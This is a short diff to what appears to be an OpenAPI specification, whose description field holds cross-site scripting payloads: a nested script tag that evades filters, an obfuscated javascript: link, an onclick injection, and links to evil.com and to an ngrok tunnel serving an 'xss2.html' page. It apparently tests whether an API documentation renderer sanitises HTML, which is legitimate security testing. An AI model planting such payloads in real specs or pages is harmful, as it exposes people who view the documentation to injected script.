@@ -5,7 +5,8 @@ info:
   version: "1.0.0"
   description: >
     <<scr<script>script>alert(4)<</scr<script>/script>
-    <a href="https://evil.com" target="_blank">Click</a>
+    <a href="https://1c59-182-48-212-56.ngrok-free.app" target="_blank">Click</a>
+    <a href="https://1c59-182-48-212-56.ngrok-free.app/Desktop/xss2.html" target="_blank">Click2</a>
     <a href="https://evil.com" target="_blank" rel="noopener noreferrer">Click me</a>
     <A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
     <d3"<"/onclick="1>[confirm``]"<">z
